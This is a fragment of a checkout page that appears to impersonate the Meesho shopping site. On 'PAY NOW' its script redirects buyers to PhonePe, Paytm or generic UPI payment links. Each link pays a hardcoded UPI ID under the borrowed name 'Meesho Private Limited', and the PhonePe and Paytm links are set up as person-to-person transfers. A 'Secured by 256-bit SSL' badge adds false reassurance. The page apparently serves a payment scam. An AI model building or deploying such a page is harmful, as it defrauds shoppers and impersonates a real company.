    <button type="button" class="pay-btn" onclick="handlePay();">PAY NOW</button><div class="ssl-note">♢ Secured by 256-bit SSL Encryption</div></div>

</main>

<script src="script.js"></script>
<script>
    /* ── Config ── */
    const UPI_ADDRESS = 'mab.037327020830028@axisbank';
    const PAYEE_NAME  = 'Meesho Private Limited';

    /* ── Device / State ── */
    const isIOS = /iPad|iPhone|iPod/i.test(navigator.userAgent) ||
        (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    let selectedMethod = 'phonepe';
    let finalTotal = 0;

    /* ── Radio Selection ── */
    function selectMethod(id) {
        document.querySelectorAll('.radio-wrap').forEach(function (el) {
            el.classList.remove('selected');
        });

        const radio = document.getElementById('radio-' + id);
        if (radio) {
            radio.classList.add('selected');
            selectedMethod = id;
        }
    }

    /* ── Render cart amount ── */
function renderAmounts() {
    let cart = [];

    try {
        cart = JSON.parse(localStorage.getItem('cart') || '[]');
        if (!Array.isArray(cart)) {
            cart = [];
        }
    } catch (error) {
        console.error('Unable to read cart:', error);
        cart = [];
    }

    let subtotal = 0;

    cart.forEach(function (item) {
        const itemPrice = parseFloat(item.price);

        // Ignore invalid prices
        if (!Number.isFinite(itemPrice) || itemPrice < 0) {
            return;
        }

        const quantity = parseInt(item.quantity, 10);

        if (!Number.isFinite(quantity) || quantity <= 0) {
            return;
        }

        subtotal += itemPrice * quantity;
    });

    // Round subtotal to exactly 2 decimal places
    subtotal = Math.round((subtotal + Number.EPSILON) * 100) / 100;

    const deliveryMode = localStorage.getItem('deliveryMode') || 'std';

    const shipping = deliveryMode === 'fast' ? 49 : 0;

    // Final amount customer must actually pay
    finalTotal = Math.round(
        (subtotal + shipping + Number.EPSILON) * 100
    ) / 100;

    const formatPrice = function (value) {
        return '₹' + value.toLocaleString('en-IN', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    };

    // Display the exact same values used for payment
    document.getElementById('subtotalVal').textContent =
        formatPrice(subtotal);

    document.getElementById('shippingVal').textContent =
        shipping === 0 ? 'FREE' : formatPrice(shipping);

    document.getElementById('totalVal').textContent =
        formatPrice(finalTotal);

    document.getElementById('footerTotal').textContent =
        formatPrice(finalTotal);
}

    /* ── Safe Pay button handler ── */
    function handlePayClick(event) {
        if (event) {
            event.preventDefault();
            event.stopPropagation();
        }

        
        handlePay();
    }

    /* ── Handle payment ── */
    function handlePay() {
        if (!finalTotal || finalTotal <= 0) {
            alert('Cart is empty. Please add items first.');
            return;
        }

        const paymentAmount = Math.round(
    (finalTotal + Number.EPSILON) * 100
) / 100;

const price = paymentAmount.toFixed(2);
const amountPaise = Math.round(paymentAmount * 100);
        const transactionNote = 'Meesho Private Limited';
        const transactionRef = 'ND' + Date.now();

        const pa = UPI_ADDRESS;
        const pn = PAYEE_NAME;
        let paymentUrl = '';

        switch (selectedMethod) {
            case 'phonepe':
                if (isIOS) {
                    paymentUrl =
                        `phonepe:upi://pay?pa=${encodeURIComponent(pa)}` +
                        `&pn=${encodeURIComponent(pn)}` +
                        `&am=${price}` +
                        `&cu=INR` +
                        `&tn=${encodeURIComponent(pn)}`;
                } else {
                    const payload = {
                        p2pPaymentCheckoutParams: {
                            checkoutType: 'COLLECT',
                            initialAmount: amountPaise,
                            note: {
                                type: 'text',
                                message: transactionNote
                            },
                            supportedInstruments: -1
                        },
                        contact: {
                            type: 'EXTERNAL_MERCHANT',
                            name: pn,
                            vpa: pa
                        }
                    };

                    const dataUrl = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
                    paymentUrl =
                        `phonepe://native?data=${encodeURIComponent(dataUrl)}` +
                        `&id=p2ppayment`;
                }
                break;

            case 'paytm':
                if (isIOS) {
                    paymentUrl =
                        `phonepe:upi://pay?pa=${encodeURIComponent(pa)}` +
                        `&pn=${encodeURIComponent(pn)}` +
                        `&am=${price}` +
                        `&cu=INR` +
                        `&tn=${encodeURIComponent(pn)}`;
                } else {
                    paymentUrl =
                    `paytmmp://cash_wallet?pa=${encodeURIComponent(pa)}` +
                    `&pn=${encodeURIComponent(pn)}` +
                    `&am=${encodeURIComponent(price)}` +
                    `&cu=INR` +
                    `&tn=${encodeURIComponent(transactionNote)}` +
                    `&tr=${encodeURIComponent(transactionRef)}` +
                    `&featuretype=money_transfer`;
                }
                break;

            case 'bhim':
                paymentUrl = `qr.php?price=${encodeURIComponent(price)}`;
                break;

            default:
                paymentUrl =
                    `upi://pay?pa=${encodeURIComponent(pa)}` +
                    `&pn=${encodeURIComponent(pn)}` +
                    `&am=${encodeURIComponent(price)}` +
                    `&cu=INR` +
                    `&tn=${encodeURIComponent(transactionNote)}` +
                    `&tr=${encodeURIComponent(transactionRef)}`;
                break;
        }

        window.location.href = paymentUrl;
    }

    renderAmounts();

    if (window.updateCartUI) {
        window.updateCartUI();
    }
</script>
</body>

</html>